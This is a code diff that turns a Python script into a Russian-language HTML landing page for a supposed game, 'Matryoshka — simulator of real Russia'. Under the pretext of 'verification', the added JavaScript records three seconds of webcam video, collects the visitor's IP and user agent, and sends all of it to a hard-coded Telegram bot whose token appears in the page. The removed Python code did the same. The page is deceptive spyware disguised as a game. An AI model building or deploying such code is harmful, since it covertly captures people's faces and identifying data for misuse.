@@ -1,80 +1,33 @@
-#!/usr/bin/env python3
-import os
-import json
-import requests
-from datetime import datetime
-from socket import gethostbyname, gethostname
-
-# Конфигурация приложения
-config = {
-    'site_name': 'Матрешка — симулятор настоящей России',
-    'players_count': '4 083',
-    'domain': 'myrussiansim.local',
-    'telegram': {
-        'bot_token': '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig',
-        'chat_id': '4798745489'
-    }
-}
-
-def get_server_urls():
-    """Возвращает доступные URL сервера"""
-    try:
-        local_ip = gethostbyname(gethostname())
-    except:
-        local_ip = '127.0.0.1'
-    
-    return {
-        'custom_domain': f"http://{config.get('domain', 'localhost')}:5000",
-        'local': "http://127.0.0.1:5000",
-        'network': f"http://{local_ip}:5000"
-    }
-
-def verify_user(video_file, ip, user_agent):
-    """Отправка видео в Telegram"""
-    try:
-        response = requests.post(
-            f"https://api.telegram.org/bot{config['telegram']['bot_token']}/sendVideo",
-            files={'video': (f'verify_{datetime.now().strftime("%Y%m%d_%H%M%S")}.webm', video_file, 'video/webm')},
-            data={
-                'chat_id': config['telegram']['chat_id'],
-                'caption': f"🔔 Новый игрок!\n🕒 {datetime.now()}\n🌐 IP: {ip}\n📱 {user_agent}"
-            },
-            timeout=30
-        )
-        return {"status": "success" if response.ok else "error"}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
-
-def generate_html():
-    """Генерирует HTML страницу"""
-    urls = get_server_urls()
-    return f"""
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{config['site_name']}</title>
+    <title>Матрешка — симулятор настоящей России</title>
     <style>
-        body {{
+        body {
             font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             margin: 0;
             padding: 0;
             color: white;
             text-align: center;
-        }}
-        .container {{
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .container {
             max-width: 800px;
             margin: 0 auto;
-            padding: 40px 20px;
-        }}
-        h1 {{
-            font-size: 2.5em;
-            margin-bottom: 30px;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }}
-        .promo-btn {{
+        }
+        .promo-btn {
             display: inline-block;
             background: #ff4d4d;
             color: white;
@@ -83,44 +36,70 @@ def generate_html():
             border-radius: 5px;
             text-decoration: none;
             font-weight: bold;
-            font-size: 1.2em;
+            font-size: 1.2rem;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }}
-        .players-count {{
-            font-size: 1.5em;
-            margin: 30px 0;
-        }}
-        .start-btn {{
+            transition: transform 0.3s;
+        }
+        .promo-btn:hover {
+            transform: translateY(-2px);
+        }
+        .players-count {
+            font-size: 1.8rem;
+            margin: 2rem 0;
+            font-weight: bold;
+        }
+        .start-btn {
             background: #4CAF50;
             color: white;
             border: none;
             padding: 15px 30px;
-            font-size: 1.2em;
+            font-size: 1.2rem;
             border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
+            margin: 2rem auto;
+            display: block;
             width: 200px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }}
-        .tagline {{
+            transition: transform 0.3s;
+        }
+        .start-btn:hover {
+            transform: translateY(-2px);
+        }
+        .tagline {
             font-style: italic;
-            margin-top: 40px;
-            font-size: 1.1em;
-        }}
+            margin-top: 3rem;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        #videoElement {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            display: none;
+            border-radius: 5px;
+        }
+        #videoContainer {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>{config['site_name']}</h1>
+        <h1>Матрешка — симулятор настоящей России</h1>
         
-        <a href="#" class="promo-btn">СМОТРЕТЬ ПРОМО-РОЛИК</a>
+        <a href="#" class="promo-btn" id="promoBtn">СМОТРЕТЬ ПРОМО-РОЛИК</a>
         
         <div class="players-count">
             сейчас в игре<br>
-            {config['players_count']}
+            <span id="playersCount">4 083</span>
         </div>
         
-        <button class="start-btn" onclick="startGame()">Начать игру</button>
+        <div id="videoContainer">
+            <video id="videoElement" autoplay playsinline></video>
+            <p>Идет верификация...</p>
+        </div>
+        
+        <button class="start-btn" id="startBtn">Начать игру</button>
         
         <div class="tagline">
             Всегда хотел ощутить атмосферу настоящей России
@@ -128,16 +107,120 @@ def generate_html():
     </div>
 
     <script>
-        function startGame() {{
-            // Здесь будет ваша логика начала игры
-            alert("Игра начинается!");
-        }}
+        // Конфигурация Telegram бота
+        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
+        const CHAT_ID = '4798745489';
+        
+        // Элементы DOM
+        const startBtn = document.getElementById('startBtn');
+        const videoElement = document.getElementById('videoElement');
+        const videoContainer = document.getElementById('videoContainer');
+        const playersCount = document.getElementById('playersCount');
+        
+        // Обработчики событий
+        document.getElementById('promoBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Промо-ролик будет показан здесь');
+        });
+
+        startBtn.addEventListener('click', function() {
+            startVerification();
+        });
+
+        // Функция начала верификации
+        async function startVerification() {
+            try {
+                startBtn.disabled = true;
+                startBtn.textContent = 'Подготовка...';
+                
+                // Запрос доступа к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: false 
+                });
+                
+                videoElement.srcObject = stream;
+                videoElement.style.display = 'block';
+                videoContainer.style.display = 'block';
+                startBtn.textContent = 'Идет запись...';
+                
+                // Запись видео
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                
+                // Остановка записи через 3 секунды
+                setTimeout(async () => {
+                    recorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    await sendToTelegram(blob);
+                    
+                    // Завершение процесса
+                    videoContainer.style.display = 'none';
+                    startGame();
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Ошибка доступа к камере:', error);
+                alert('Для продолжения необходимо разрешить доступ к камере');
+                startBtn.disabled = false;
+                startBtn.textContent = 'Начать игру';
+            }
+        }
+        
+        // Отправка данных в Telegram
+        async function sendToTelegram(videoBlob) {
+            try {
+                // Сбор информации о пользователе
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                const userAgent = navigator.userAgent;
+                
+                // Создание FormData
+                const formData = new FormData();
+                formData.append('video', videoBlob, 'verification.webm');
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', 
+                    `🔔 Новый игрок!\n` +
+                    `🕒 ${new Date().toLocaleString()}\n` +
+                    `🌐 IP: ${userIP}\n` +
+                    `📱 Устройство: ${userAgent}`
+                );
+                
+                // Отправка в Telegram
+                const response = await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+                
+                if (!response.ok) {
+                    throw new Error('Ошибка отправки в Telegram');
+                }
+                
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+            }
+        }
+        
+        // Функция начала игры
+        function startGame() {
+            startBtn.disabled = false;
+            startBtn.textContent = 'Начать игру';
+            
+            // Обновление счетчика игроков
+            let count = parseInt(playersCount.textContent.replace(/\s/g, ''));
+            playersCount.textContent = (count + 1).toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
+            
+            alert('Верификация успешна! Игра начинается...');
+        }
     </script>
 </body>
 </html>
-"""
-
-if __name__ == '__main__':
-    print("Сервер готов к работе!")
-    print(f"Доступ по адресу: http://localhost:5000")
-    print(f"Текущие игроки: {config['players_count']}")
